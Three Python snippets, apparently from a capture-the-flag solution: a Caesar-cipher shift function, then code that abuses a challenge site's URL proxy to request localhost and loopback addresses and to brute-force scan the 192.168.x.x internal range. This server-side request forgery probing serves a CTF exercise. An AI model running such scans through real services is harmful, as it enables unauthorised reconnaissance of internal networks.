```python
import string

def compute_shifted_message(message, key):
    shifted_message = []
    for l in message:
        if l in string.ascii_lowercase:  # "abcdefghijklmnopqrstuvwxyz"
            shifted_message.append(chr((ord(l) - 97 + key) % 26 + 97))
        elif l in string.ascii_uppercase:
            shifted_message.append(chr((ord(l) - 65 + key) % 26 + 65))
        else:
            shifted_message.append(l)
    return ''.join(shifted_message)
```

```python
import requests

url = "https://challengecybersec.fr/b34658e7f6221024f8d18a7f0d3497e4/proxy?url="

def check(target):
    r = requests.get(url + target)
    if r.status_code == 200:
        if 'title' in r.json():
            print(target, r.json()['title'])
            return True
        else:
            print(target, r.json())
            return True
    else:
        print(f"No: {target} - {r.status_code} {r.text}")
        return False

for target in ['https://google.fr', '0.0.0.1', '127.0.0.1', 'http://localhost', 'https://www.google.com', 'localhost']:
    check(target)
```

```python
from tqdm.notebook import tqdm

pairs = [(i, j) for i in range(256) for j in range(256)]
for i, j in tqdm(pairs):
    if check(f"http://192.168.{i}.{j}"):
        break;
```
